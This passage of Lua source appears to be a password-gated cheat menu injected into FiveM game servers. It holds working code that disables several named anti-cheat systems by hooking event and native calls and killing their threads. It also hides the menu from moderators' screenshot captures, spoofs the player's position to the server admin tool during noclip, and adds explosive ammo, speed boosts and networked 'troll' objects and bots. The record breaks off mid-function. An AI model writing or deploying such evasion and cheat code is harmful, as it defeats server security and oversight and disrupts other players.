            end
            return invoke(h, ...)
        end
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and (info.source:find("EC_AC") or info.source:find("Eagle")) then
                    coroutine.close(co)
                end
            end
        end
    ]]

    local reaper_code = [[
        local n = function() end
        local t = function() return true end
        local function block(e, ...)
            if type(e) == "string" and e:find("Reaper") then return end
            return TriggerEvent(e, ...)
        end
        _G.TriggerEvent = block
        local ts = _G.TriggerServerEvent
        _G.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and e:find("Reaper") then return end
            return ts(e, ...)
        end
        local natives = {
            0x3E8F2A7C4B6D1F9A, 0x9D2F5B8A1E4C7D6F, 0x7C4F2A8E1B6D3F5A,
            0x2B8F4C7D1A6E3F9C, 0x5D1F8A3C6B2E4F7A, 0x8E3F2A7C5B1D6F4E
        }
        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(natives) do
                if h == native then return false end
            end
            return invoke(h, ...)
        end
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and info.source:find("Reaper") then
                    coroutine.close(co)
                end
            end
        end
        local vars = { "ReaperV4", "ReaperAC", "ReaperDetect" }
        for _, v in ipairs(vars) do
            _G[v] = nil
        end
    ]]

    local reason_code = [[
        local n = function() end
        local function block(e, ...)
            if type(e) == "string" and (e:find("Reason") or e:find("RAC")) then return end
            return TriggerEvent(e, ...)
        end
        _G.TriggerEvent = block
        local ts = _G.TriggerServerEvent
        _G.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (e:find("Reason") or e:find("RAC")) then return end
            return ts(e, ...)
        end
        local bag = LocalPlayer.state
        for k, v in pairs(bag) do
            if type(v) == "function" and (k:find("reason") or k:find("Reason")) then
                bag[k] = n
            end
        end
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and (info.source:find("Reason") or info.source:find("RAC")) then
                    coroutine.close(co)
                end
            end
        end
        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(h, ...)
            for _, native in ipairs(natives) do
                if h == native then return false end
            end
            return invoke(h, ...)
        end
    ]]

    inject_bp("FiveGuard", fg_code)
    inject_bp("ElectronAC", electron_code)
    inject_bp("WaveShield", ws_code)
    inject_bp("EC_AC", eagle_code)
    inject_bp("ReaperV4", reaper_code)
    inject_bp("RAC", reason_code)
end

function Menu.SpawnVehicle(modelName)
    local model = GetHashKey(modelName)
    RequestModel(model)
    local timeout = 0
    while not HasModelLoaded(model) and timeout < 100 do
        Citizen.Wait(10)
        timeout = timeout + 1
    end
    if HasModelLoaded(model) then
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local heading = GetEntityHeading(ped)
        local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, false)
        SetPedIntoVehicle(ped, vehicle, -1)
        SetEntityAsNoLongerNeeded(vehicle)
        SetModelAsNoLongerNeeded(model)
        SetVehicleNumberPlateText(vehicle, "SHADOW")
    else
    end
end

Menu.ExplosiveAmmoEnabled = false
Menu.FireAmmoEnabled = false

Citizen.CreateThread(function()
    while true do
        if Menu.ExplosiveAmmoEnabled then
            SetExplosiveAmmoThisFrame(PlayerId())
        end
        if Menu.FireAmmoEnabled then
            SetFireAmmoThisFrame(PlayerId())
        end
        Citizen.Wait(0)
    end
end)

Menu.SpeedBoostEnabled = false

Citizen.CreateThread(function()
    while true do
        if Menu.SpeedBoostEnabled then
            local ped = PlayerPedId()
            if IsPedInAnyVehicle(ped, false) then
                local veh = GetVehiclePedIsIn(ped, false)
                if IsControlPressed(0, 21) then -- Shift
                    local speed = GetEntitySpeed(veh)
                    SetVehicleForwardSpeed(veh, speed + 2.0)
                end
            end
        end
        Citizen.Wait(0)
    end
end)

Citizen.CreateThread(function()
    local loadingScene = false
    while true do
        if Menu.ForceMapLoad then
            local coords = nil
            if Menu.FreecamEnabled and DoesCamExist(Menu.FreecamCam) then
                coords = GetCamCoord(Menu.FreecamCam)
            else
                coords = GetEntityCoords(PlayerPedId())
            end
            
            if coords then
                pcall(function()
                    RequestCollisionAtCoord(coords.x, coords.y, coords.z)
                    if not loadingScene then
                        NewLoadSceneStartSphere(coords.x, coords.y, coords.z, 100.0, 0)
                        loadingScene = true
                    else
                        NewLoadSceneStartSphere(coords.x, coords.y, coords.z, 100.0, 0)
                    end
                end)
            end
        else
            if loadingScene then
                pcall(function()
                    NewLoadSceneStop()
                end)
                loadingScene = false
            end
        end
        Citizen.Wait(500)
    end
end)

-- Screenshot protection to hide GUI and HUD dynamically
Citizen.CreateThread(function()
    local hideUI = function()
        Menu.Visible = false
        Menu.ShowActiveHUD = false
        Menu.FreecamHUDHidden = true
    end
    local showUI = function()
        Menu.Visible = true
        Menu.ShowActiveHUD = true
        Menu.FreecamHUDHidden = false
    end
    
    RegisterNetEvent("__cfx_export_screenshot-basic_requestScreenshot")
    AddEventHandler("__cfx_export_screenshot-basic_requestScreenshot", function(cb)
        hideUI()
        Citizen.Wait(250)
    end)
    
    AddEventHandler("screenshot-basic:requestScreenshot", function(cb)
        hideUI()
        Citizen.Wait(250)
    end)
    
    RegisterNetEvent("screenshot-basic:completed")
    AddEventHandler("screenshot-basic:completed", function()
        Citizen.Wait(100)
        showUI()
    end)
    
    while true do
        if exports and exports["screenshot-basic"] then
            local oldRequest = exports["screenshot-basic"].requestScreenshot
            if oldRequest and not Menu.ScreenshotHooked then
                Menu.ScreenshotHooked = true
                exports["screenshot-basic"].requestScreenshot = function(self, cb, ...)
                    local wasVisible = Menu.Visible
                    local wasActiveHUD = Menu.ShowActiveHUD
                    Menu.Visible = false
                    Menu.ShowActiveHUD = false
                    Menu.FreecamHUDHidden = true
                    Citizen.Wait(250)
                    local res = oldRequest(self, cb, ...)
                    Citizen.Wait(300)
                    Menu.Visible = wasVisible
                    Menu.ShowActiveHUD = wasActiveHUD
                    Menu.FreecamHUDHidden = false
                    return res
                end
            end
        end
        Citizen.Wait(2000)
    end
end)

function Menu.DrawFreecamHUD()
    if not Menu.FreecamEnabled or not DoesCamExist(Menu.FreecamCam) or Menu.FreecamHUDHidden then return end
    
    local camCoords = GetCamCoord(Menu.FreecamCam)
    local screenWidth = 1920
    local screenHeight = 1080
    if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
        screenWidth = Susano.GetScreenWidth()
        screenHeight = Susano.GetScreenHeight()
    end
    
    -- 1. BOTTOM INFORMATION BANNER
    local w = 620
    local h = 55
    local x = (screenWidth - w) / 2
    local y = screenHeight - h - 40
    local alpha = 0.95
    
    local text = string.format("Freecam | Speed: %.1f | X: %.1f Y: %.1f Z: %.1f", Menu.FreecamSpeed or 1.0, camCoords.x, camCoords.y, camCoords.z)
    local weaponText = "LClick: Fire | RClick: Eject nearest | Keys [1-6]: Toggles | [E]: Spawn Bot | [F]: Spawn Object"
    
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, y, w, h, 0.05, 0.05, 0.08, alpha, 8)
        Susano.DrawRectFilled(x, y, w, 2, 0.0, 0.95, 1.0, 0.8, 0)
    else
        Menu.DrawRect(x, y, w, h, 13, 13, 20, 230)
        Menu.DrawRect(x, y, w, 2, 0, 242, 254, 200)
    end
    
    local textX1 = x + (w - 400) / 2
    if Susano and Susano.GetTextWidth then
        textX1 = x + (w - Susano.GetTextWidth(text, 12)) / 2
    end
    Menu.DrawText(textX1, y + 8, text, 12, 1.0, 1.0, 1.0, 1.0)
    
    local textX2 = x + (w - 400) / 2
    if Susano and Susano.GetTextWidth then
        textX2 = x + (w - Susano.GetTextWidth(weaponText, 10)) / 2
    end
    Menu.DrawText(textX2, y + 30, weaponText, 10, 0.0, 0.95, 1.0, 1.0)

    -- 2. LEFT SETTINGS PANEL (Glassmorphic Card)
    local panelW = 320
    local panelH = 265
    local panelX = 25
    local panelY = (screenHeight - panelH) / 2

    if Susano and Susano.DrawRectFilled then
        -- Fill
        Susano.DrawRectFilled(panelX, panelY, panelW, panelH, 0.04, 0.04, 0.06, 0.5, 16)
        -- Border
        local borderAlpha = 0.05
        Susano.DrawRectFilled(panelX, panelY, panelW, 1, 1.0, 1.0, 1.0, borderAlpha, 0)
        Susano.DrawRectFilled(panelX, panelY + panelH - 1, panelW, 1, 1.0, 1.0, 1.0, borderAlpha, 0)
        Susano.DrawRectFilled(panelX, panelY, 1, panelH, 1.0, 1.0, 1.0, borderAlpha, 0)
        Susano.DrawRectFilled(panelX + panelW - 1, panelY, 1, panelH, 1.0, 1.0, 1.0, borderAlpha, 0)
    else
        Menu.DrawRect(panelX, panelY, panelW, panelH, 10, 10, 15, 130)
    end

    -- Title
    local headerText = "FREECAM PANEL"
    local headerW = 0
    if Susano and Susano.GetTextWidth then
        headerW = Susano.GetTextWidth(headerText, 14)
    else
        headerW = string.len(headerText) * 7
    end
    Menu.DrawText(panelX + (panelW - headerW) / 2, panelY + 12, headerText, 14, 0.9, 0.98, 1.0, 1.0)

    -- Divider neon line
    local lineW = panelW - 50
    local lineX = panelX + (panelW - lineW) / 2
    local lineY = panelY + 32
    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(lineX, lineY, lineW, 2, 0.0, 0.95, 1.0, 0.6, 1)
    else
        Menu.DrawRect(lineX, lineY, lineW, 2, 0, 242, 254, 200)
    end

    -- Menu items
    local itemStartY = panelY + 45
    local itemH = 32

    local settingsList = {
        { label = "[1] Weapon Ammo", value = (Menu.FreecamAmmo or "stungun"):upper() },
        { label = "[2] Net Objects", value = Menu.NetworkedObjects and "GLOBAL" or "STEALTH (LOCAL)" },
        { label = "[3] Bot Model", value = (Menu.FreecamBot or "Cop"):upper() },
        { label = "[4] Net Bots", value = Menu.NetworkedBots and "GLOBAL" or "STEALTH (LOCAL)" },
        { label = "[5] Troll Object", value = (Menu.FreecamObject or "UFO"):upper() },
        { label = "[6] Auto Map Loader", value = Menu.ForceMapLoad and "ON" or "OFF" }
    }

    for i, item in ipairs(settingsList) do
        local itemY = itemStartY + (i - 1) * itemH

        -- Label text
        Menu.DrawText(panelX + 20, itemY + 5, item.label, 11, 0.7, 0.7, 0.7, 0.9)

        -- Value text
        local valColor = {0.0, 0.95, 1.0, 1.0}
        if item.value == "GLOBAL" or item.value == "ON" then
            valColor = {1.0, 0.75, 0.0, 1.0}
        elseif item.value == "STEALTH (LOCAL)" or item.value == "OFF" then
            valColor = {0.0, 0.9, 0.0, 0.9}
        end

        local valW = 0
        if Susano and Susano.GetTextWidth then
            valW = Susano.GetTextWidth(item.value, 11)
        else
            valW = string.len(item.value) * 6
        end
        Menu.DrawText(panelX + panelW - valW - 20, itemY + 5, item.value, 11, valColor[1], valColor[2], valColor[3], valColor[4])
    end
end

CreateThread(function()
    while true do
        if Menu.CustomLoading and Menu.CustomLoading.active then
            local currentTime = GetGameTimer() or 0
            local elapsed = currentTime - Menu.CustomLoading.startTime
            local progress = (elapsed / Menu.CustomLoading.duration) * 100.0
            if progress >= 100.0 then
                progress = 100.0
                Menu.CustomLoading.active = false
                if Menu.CustomLoading.callback then
                    local success, err = pcall(Menu.CustomLoading.callback)
                    if not success then
                        print("Error running custom loading callback: " .. tostring(err))
                    end
                end
            end
            Menu.CustomLoading.progress = progress

            if Susano and Susano.BeginFrame then
                Susano.BeginFrame()
                Menu.DrawCustomLoadingScreen(progress)
                if Susano.SubmitFrame then
                    Susano.SubmitFrame()
                end
            end
        elseif not Menu.Authenticated then
            Menu.DrawPasswordScreen()
        else
            Menu.Render()

            if Menu.LoadingComplete and not (Menu.CustomLoading and Menu.CustomLoading.active) then
                Menu.HandleInput()
            end
        end

        Wait(0)
    end
end)

if Menu.Banner.enabled and Menu.Banner.imageUrl then
    Menu.LoadBannerTexture(Menu.Banner.imageUrl)
end

Menu.LoadWarningTexture("https://cdn.discordapp.com/attachments/1400482639387033792/1511798948384215100/s6r2v91.png?ex=6a226cbd&is=6a211b3d&hm=c501096a23664ddc83c55c65c6a441614c85c0fd752799ed1f4b013a47fb1fab&")
Menu.LoadCustomTexture("weapon", "https://cdn.discordapp.com/attachments/1400482639387033792/1512157121767014431/8h5htz4.png?ex=6a231190&is=6a21c010&hm=8ebc9d8ddaaabf84431f7fd6d93b93311663b7f1f0bc12f5a8b70e0d7aad9872&")
Menu.LoadCustomTexture("vehicle", "https://cdn.discordapp.com/attachments/1400482639387033792/1512157967926034622/6jzmx47.png?ex=6a23125a&is=6a21c0da&hm=e339d319aee41a406dd010fdace049b967ea1b2b12671d148604ac0db3780944&")

function Menu.CheckPassword(pwd)
    for _, v in ipairs(Menu.ValidPasswords) do
        if pwd == v then return true end
    end
    return false
end

function Menu.DrawPasswordScreen()
    if not Menu.PasswordScreen then return end
    if not Susano or not Susano.BeginFrame then return end

    local screenW = 1920
    local screenH = 1080
    if Susano.GetScreenWidth and Susano.GetScreenHeight then
        screenW = Susano.GetScreenWidth()
        screenH = Susano.GetScreenHeight()
    end

    -- Smooth fade in
    Menu.PasswordAlpha = Menu.PasswordAlpha + (1.0 - Menu.PasswordAlpha) * 0.08
    local alpha = Menu.PasswordAlpha

    Susano.BeginFrame()

    -- Full screen dark overlay
    if Susano.DrawRectFilled then
        Susano.DrawRectFilled(0, 0, screenW, screenH, 0.02, 0.02, 0.06, 0.95 * alpha, 0)
    else
        Menu.DrawRect(0, 0, screenW, screenH, 5, 5, 15, math.floor(242 * alpha))
    end

    -- Animated blue glow lines at top and bottom
    local time = GetGameTimer() / 1000.0
    local glowPulse = (math.sin(time * 2.0) + 1.0) * 0.5
    local glowA = 0.3 + glowPulse * 0.4

    if Susano.DrawRectFilled then
        Susano.DrawRectFilled(0, 0, screenW, 2, 0.1, 0.4, 1.0, glowA * alpha, 0)
        Susano.DrawRectFilled(0, screenH - 2, screenW, 2, 0.1, 0.4, 1.0, glowA * alpha, 0)
    end

    -- Main panel
    local panelW = 380
    local panelH = 220
    local shakeX = 0
    if Menu.PasswordShake > 0 then
        shakeX = math.sin(GetGameTimer() * 0.05) * Menu.PasswordShake
        Menu.PasswordShake = Menu.PasswordShake * 0.9
        if Menu.PasswordShake < 0.3 then Menu.PasswordShake = 0 end
    end
    local panelX = (screenW / 2) - (panelW / 2) + shakeX
    local panelY = (screenH / 2) - (panelH / 2)

    -- Panel background with blue border glow
    if Susano.DrawRectFilled then
        -- Outer glow
        Susano.DrawRectFilled(panelX - 2, panelY - 2, panelW + 4, panelH + 4, 0.1, 0.35, 0.9, 0.5 * alpha, 10)
        -- Panel body
        Susano.DrawRectFilled(panelX, panelY, panelW, panelH, 0.06, 0.06, 0.1, 0.97 * alpha, 8)
    else
        Menu.DrawRect(panelX - 2, panelY - 2, panelW + 4, panelH + 4, 25, 90, 230, math.floor(128 * alpha))
        Menu.DrawRect(panelX, panelY, panelW, panelH, 15, 15, 25, math.floor(248 * alpha))
    end

    -- Top accent line (animated gradient)
    local lineR = 0.15 + glowPulse * 0.1
    local lineG = 0.35 + glowPulse * 0.15
    local lineB = 0.95
    if Susano.DrawRectFilled then
        Susano.DrawRectFilled(panelX, panelY, panelW, 3, lineR, lineG, lineB, 1.0 * alpha, 0)
    else
        Menu.DrawRect(panelX, panelY, panelW, 3, math.floor(lineR*255), math.floor(lineG*255), math.floor(lineB*255), math.floor(255 * alpha))
    end

    -- Lock icon
    local lockIcon = "LOCKED"
    local lockSize = 14
    local lockW = 0
    if Susano.GetTextWidth then
        lockW = Susano.GetTextWidth(lockIcon, lockSize)
    else
        lockW = #lockIcon * 8
    end
    Menu.DrawText(panelX + (panelW / 2) - (lockW / 2), panelY + 20, lockIcon, lockSize, 0.3, 0.55, 1.0, 0.7 * alpha)

    -- Title
    local title = "ENTER PASSWORD"
    local titleSize = 22
    local titleW = 0
    if Susano.GetTextWidth then
        titleW = Susano.GetTextWidth(title, titleSize)
    else
        titleW = #title * 11
    end
    Menu.DrawText(panelX + (panelW / 2) - (titleW / 2), panelY + 42, title, titleSize, 1.0, 1.0, 1.0, 1.0 * alpha)

    -- Subtitle
    local sub = "Authentication required to continue"
    local subSize = 13
    local subW = 0
    if Susano.GetTextWidth then
        subW = Susano.GetTextWidth(sub, subSize)
    else
        subW = #sub * 7
    end
    Menu.DrawText(panelX + (panelW / 2) - (subW / 2), panelY + 72, sub, subSize, 0.5, 0.5, 0.6, 0.8 * alpha)

    -- Input box
    local boxW = panelW - 50
    local boxH = 36
    local boxX = panelX + 25
    local boxY = panelY + 100

    -- Input field border
    local borderR, borderG, borderB = 0.15, 0.4, 0.95
    if Menu.PasswordError and (GetGameTimer() - Menu.PasswordErrorTime) < 1500 then
        borderR, borderG, borderB = 0.95, 0.15, 0.15
    end

    if Susano.DrawRectFilled then
        Susano.DrawRectFilled(boxX - 1, boxY - 1, boxW + 2, boxH + 2, borderR, borderG, borderB, 0.8 * alpha, 6)
        Susano.DrawRectFilled(boxX, boxY, boxW, boxH, 0.08, 0.08, 0.12, 1.0 * alpha, 5)
    else
        Menu.DrawRect(boxX - 1, boxY - 1, boxW + 2, boxH + 2, math.floor(borderR*255), math.floor(borderG*255), math.floor(borderB*255), math.floor(204 * alpha))
        Menu.DrawRect(boxX, boxY, boxW, boxH, 20, 20, 30, math.floor(255 * alpha))
    end

    -- Display masked password (dots) with blinking cursor
    local pwd = Menu.PasswordInput or ""
    local masked = string.rep("*", #pwd)
    if math.floor(GetGameTimer() / 500) % 2 == 0 then
        masked = masked .. "|"
    end
    Menu.DrawText(boxX + 12, boxY + 8, masked, 18, 1.0, 1.0, 1.0, 0.95 * alpha)

    -- Error message
    if Menu.PasswordError and (GetGameTimer() - Menu.PasswordErrorTime) < 2000 then
        local errFade = 1.0
        local errElapsed = GetGameTimer() - Menu.PasswordErrorTime
        if errElapsed > 1500 then
            errFade = 1.0 - ((errElapsed - 1500) / 500)
        end
        local errMsg = "Invalid password!"
        local errSize = 13
        local errW = 0
        if Susano.GetTextWidth then
            errW = Susano.GetTextWidth(errMsg, errSize)
        else
            errW = #errMsg * 7
        end
        Menu.DrawText(panelX + (panelW / 2) - (errW / 2), panelY + 145, errMsg, errSize, 1.0, 0.25, 0.25, errFade * alpha)
    end

    -- Hint text
    local hint = "Press ENTER to submit"
    local hintSize = 12
    local hintW = 0
    if Susano.GetTextWidth then
        hintW = Susano.GetTextWidth(hint, hintSize)
    else
        hintW = #hint * 6
    end
    Menu.DrawText(panelX + (panelW / 2) - (hintW / 2), panelY + panelH - 35, hint, hintSize, 0.4, 0.4, 0.5, 0.6 * alpha)

    -- Dots decoration
    local dotY = panelY + panelH - 15
    local dotSpacing = 8
    local totalDotsW = 4 * dotSpacing
    local dotStartX = panelX + (panelW / 2) - (totalDotsW / 2)
    for d = 0, 4 do
        local dotAlpha = 0.2 + (math.sin(time * 3.0 + d) + 1.0) * 0.3
        if Susano.DrawRectFilled then
            Susano.DrawRectFilled(dotStartX + d * dotSpacing, dotY, 3, 3, 0.2, 0.5, 1.0, dotAlpha * alpha, 2)
        end
    end

    if Susano.SubmitFrame then
        Susano.SubmitFrame()
    end

    -- Handle keyboard input
    if Susano.GetAsyncKeyState then
        -- Enter key
        if Menu.IsKeyJustPressed(0x0D) then
            if Menu.CheckPassword(Menu.PasswordInput) then
                Menu.Authenticated = true
                Menu.PasswordScreen = false
                Menu.PasswordInput = ""
            else
                Menu.PasswordError = true
                Menu.PasswordErrorTime = GetGameTimer()
                Menu.PasswordShake = 12
                Menu.PasswordInput = ""
            end
        end

        -- Backspace
        if Menu.IsKeyJustPressed(0x08) then
            if #Menu.PasswordInput > 0 then
                Menu.PasswordInput = string.sub(Menu.PasswordInput, 1, -2)
            end
        end

        -- Shift check
        local shiftPressed = false
        if Susano.GetAsyncKeyState(0x10) or Susano.GetAsyncKeyState(0xA0) or Susano.GetAsyncKeyState(0xA1) then
            shiftPressed = true
        end

        -- Control check (Ctrl)
        local ctrlPressed = false
        if Susano.GetAsyncKeyState(0x11) or Susano.GetAsyncKeyState(0xA2) or Susano.GetAsyncKeyState(0xA3) then
            ctrlPressed = true
        end

        -- Ctrl+V paste check
        if ctrlPressed and Menu.IsKeyJustPressed(0x56) then
            if Susano.GetClipboardText then
                local status, clipText = pcall(Susano.GetClipboardText)
                if status and clipText then
                    clipText = string.gsub(clipText, "[\r\n\t]", "")
                    Menu.PasswordInput = Menu.PasswordInput .. clipText
                end
            end
        end

        -- Letters A-Z
        if not ctrlPressed then
            for i = 0x41, 0x5A do
                if Menu.IsKeyJustPressed(i) then
                    local char = string.char(i)
                    if not shiftPressed then char = string.lower(char) end
                    Menu.PasswordInput = Menu.PasswordInput .. char
                end
            end
        end

        -- Numbers 0-9
        if not ctrlPressed then
            for i = 0x30, 0x39 do
                if Menu.IsKeyJustPressed(i) then
                    Menu.PasswordInput = Menu.PasswordInput .. string.char(i)
                end
            end
        end
    end
end

function Menu.OpenInput(title, subtitle, callback)
    if type(subtitle) == "function" then
        callback = subtitle
        subtitle = "Enter text below"
    end
    Menu.InputTitle = title
    Menu.InputSubtitle = subtitle
    Menu.InputText = ""
    Menu.InputCallback = callback
    Menu.InputOpen = true
    Menu.SelectingKey = false
    Menu.SelectingBind = false
end

function Menu.DrawInputWindow()
    if not Menu.InputOpen then return end

    local screenWidth = 1920
    local screenHeight = 1080
    if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
        screenWidth = Susano.GetScreenWidth()
        screenHeight = Susano.GetScreenHeight()
    end

    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(0, 0, screenWidth, screenHeight, 0, 0, 0, 0.6, 0)
    else
        Menu.DrawRect(0, 0, screenWidth, screenHeight, 0, 0, 0, 150)
    end

    local width = 350
    local height = 130
    local x = (screenWidth / 2) - (width / 2)
    local y = (screenHeight / 2) - (height / 2)

    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, y, width, height, 0.08, 0.08, 0.08, 1.0, 6)
    else
        Menu.DrawRect(x, y, width, height, 20, 20, 20, 255)
    end

    local r = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0) or 1.0
    local g = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0) or 0.0
    local b = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0) or 1.0

    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(x, y, width, 2, r, g, b, 1.0, 0)
    else
        Menu.DrawRect(x, y, width, 2, math.floor(r*255), math.floor(g*255), math.floor(b*255), 255)
    end

    local titleText = Menu.InputTitle or "Input"
    local titleSize = 20
    local titleWidth = 0
    if Susano and Susano.GetTextWidth then
        titleWidth = Susano.GetTextWidth(titleText, titleSize)
    else
        titleWidth = string.len(titleText) * 10
    end
    local titleX = x + (width / 2) - (titleWidth / 2)
    Menu.DrawText(titleX, y + 15, titleText, titleSize, 1.0, 1.0, 1.0, 1.0)

    local subText = Menu.InputSubtitle or "Enter text below:"
    Menu.DrawText(x + 20, y + 45, subText, 14, 0.7, 0.7, 0.7, 1.0)

    local boxW = width - 40
    local boxH = 30
    local boxX = x + 20
    local boxY = y + 70

    if Susano and Susano.DrawRectFilled then
        Susano.DrawRectFilled(boxX - 1, boxY - 1, boxW + 2, boxH + 2, 1.0, 1.0, 1.0, 0.8, 4)
        Susano.DrawRectFilled(boxX, boxY, boxW, boxH, 0.15, 0.15, 0.15, 1.0, 4)
    else
        Menu.DrawRect(boxX, boxY, boxW, boxH, 40, 40, 40, 255)
    end

    local displayText = Menu.InputText or ""
    if math.floor(GetGameTimer() / 500) % 2 == 0 then
        displayText = displayText .. "|"
    end

    local maxDisplayChars = 30
    if string.len(displayText) > maxDisplayChars then
        displayText = "..." .. string.sub(displayText, -maxDisplayChars)
    end

    Menu.DrawText(boxX + 10, boxY + 5, displayText, 16, 1.0, 1.0, 1.0, 1.0)

    if Susano and Susano.GetAsyncKeyState then
         if Menu.IsKeyJustPressed(0x0D) then
             Menu.InputOpen = false
             if Menu.InputCallback then
                 Menu.InputCallback(Menu.InputText)
             end
         end

         if Menu.IsKeyJustPressed(0x08) then
             if string.len(Menu.InputText) > 0 then
                 Menu.InputText = string.sub(Menu.InputText, 1, -2)
             end
         end

         if Menu.IsKeyJustPressed(0x1B) then
             Menu.InputOpen = false
         end

         local shiftPressed = false
         if Susano.GetAsyncKeyState(0x10) or Susano.GetAsyncKeyState(0xA0) or Susano.GetAsyncKeyState(0xA1) then
             shiftPressed = true
         end

         local ctrlPressed = false
         if Susano.GetAsyncKeyState(0x11) or Susano.GetAsyncKeyState(0xA2) or Susano.GetAsyncKeyState(0xA3) then
             ctrlPressed = true
         end

          -- Ctrl+V paste check
          if ctrlPressed and Menu.IsKeyJustPressed(0x56) then
              if Susano.GetClipboardText then
                  local status, clipText = pcall(Susano.GetClipboardText)
                  if status and clipText then
                      clipText = string.gsub(clipText, "[\r\n\t]", "")
                      Menu.InputText = Menu.InputText .. clipText
                  end
              end
          end

          if not ctrlPressed then
              for i = 0x41, 0x5A do
                  if Menu.IsKeyJustPressed(i) then
                      local char = string.char(i)
                      if not shiftPressed then
                          char = string.lower(char)
                      end
                      Menu.InputText = Menu.InputText .. char
                  end
              end
              for i = 0x30, 0x39 do
                  if Menu.IsKeyJustPressed(i) then
                      Menu.InputText = Menu.InputText .. string.char(i)
                  end
              end
              if Menu.IsKeyJustPressed(0x20) then
                  Menu.InputText = Menu.InputText .. " "
              end
              if Menu.IsKeyJustPressed(0xBD) then -- Minus/Underscore
                  if shiftPressed then Menu.InputText = Menu.InputText .. "_" else Menu.InputText = Menu.InputText .. "-" end
              end
          end
    end
end

Menu.NoClipEnabled = false
Menu.NoClipSpeed = 1.0
Menu.NoClipThread = nil
Menu.NoClipSpoofThread = nil
Menu.NoClipOriginalCoords = nil

function StartNoClip()
    if Menu.NoClipThread then return end

    Menu.NoClipEnabled = true

    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    Menu.NoClipOriginalCoords = { x = coords.x, y = coords.y, z = coords.z }

    Menu.NoClipSpoofThread = Citizen.CreateThread(function()
        while Menu.NoClipEnabled do
            if Menu.NoClipOriginalCoords then
                local fakeX = Menu.NoClipOriginalCoords.x + math.random(-1, 1) * 0.01
                local fakeY = Menu.NoClipOriginalCoords.y + math.random(-1, 1) * 0.01
                local fakeZ = Menu.NoClipOriginalCoords.z

                Menu.SafeExec(string.format([[TriggerServerEvent('txsv:req:playerPosition', %f, %f, %f)]], fakeX, fakeY, fakeZ))

                local playerPed = PlayerPedId()
                if NetworkIsPlayerActive(PlayerId()) then
                    SetEntityCoordsNoOffset(playerPed, GetEntityCoords(playerPed).x, GetEntityCoords(playerPed).y, GetEntityCoords(playerPed).z, false, false, false)
                end
            end
            Citizen.Wait(1000)
        end
    end)

    Menu.NoClipThread = Citizen.CreateThread(function()
        while Menu.NoClipEnabled do
            local ped = PlayerPedId()
            local inVehicle = IsPedInAnyVehicle(ped, false)
            local entity = ped

            if inVehicle then
                entity = GetVehiclePedIsIn(ped, false)
            end

            local x, y, z = table.unpack(GetEntityCoords(entity))

            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
            local pitch = GetGameplayCamRelativePitch()

            local dx = -math.sin(heading * math.pi / 180.0) * math.cos(pitch * math.pi / 180.0)
            local dy = math.cos(heading * math.pi / 180.0) * math.cos(pitch * math.pi / 180.0)
            local dz = math.sin(pitch * math.pi / 180.0)

            local len = math.sqrt(dx * dx + dy * dy + dz * dz)
            if len ~= 0 then
                dx = dx / len
                dy = dy / len
                dz = dz / len
            end

            SetEntityCollision(entity, false, false)
            FreezeEntityPosition(entity, true)

            if inVehicle then
                SetVehicleGravityAmount(entity, 0.0)
                SetVehicleEngineOn(entity, true, true, false)
            end

            SetEntityRotation(entity, 0.0, 0.0, heading, 2, true)

            local speed = Menu.NoClipSpeed
            if IsControlPressed(0, 21) then -- Left Shift
                speed = speed * 3.0
            end
            if IsControlPressed(0, 36) then -- Left Ctrl
                speed = speed * 0.3
            end

            if IsControlPressed(0, 32) then -- W - Forward
                x = x + dx * speed
                y = y + dy * speed
                z = z + dz * speed
            end
            if IsControlPressed(0, 33) then -- S - Backward
                x = x - dx * speed
                y = y - dy * speed
                z = z - dz * speed
            end
            if IsControlPressed(0, 34) then -- A - Left strafe
                x = x + (-dy) * speed
                y = y + dx * speed
            end
            if IsControlPressed(0, 35) then -- D - Right strafe
                x = x + dy * speed
                y = y + (-dx) * speed
            end
            if IsControlPressed(0, 44) then -- Q - Down
                z = z - speed
            end
            if IsControlPressed(0, 38) then -- E - Up
                z = z + speed
            end

            SetEntityCoordsNoOffset(entity, x, y, z, true, true, true)

            SetPlayerWantedLevel(PlayerId(), 0, false)
            SetPlayerWantedLevelNow(PlayerId(), false)

            Citizen.Wait(0)
        end

        Menu.NoClipThread = nil
    end)
end

function StopNoClip()
    Menu.NoClipEnabled = false

    Citizen.Wait(50)

    local ped = PlayerPedId()
    local inVehicle = IsPedInAnyVehicle(ped, false)

    if inVehicle then
        local vehicle = GetVehiclePedIsIn(ped, false)
        FreezeEntityPosition(vehicle, false)
        SetEntityCollision(vehicle, true, true)
        SetVehicleGravityAmount(vehicle, 9.8)
    end

    FreezeEntityPosition(ped, false)
    SetEntityCollision(ped, true, true)
    SetEntityVisible(ped, true, false)

    Menu.NoClipThread = nil
    Menu.NoClipSpoofThread = nil
    Menu.NoClipOriginalCoords = nil
end


Menu.LaserEyesEnabled = false

Citizen.CreateThread(function()
    while true do
        if Menu.LaserEyesEnabled and IsControlPressed(0, 23) then -- F key
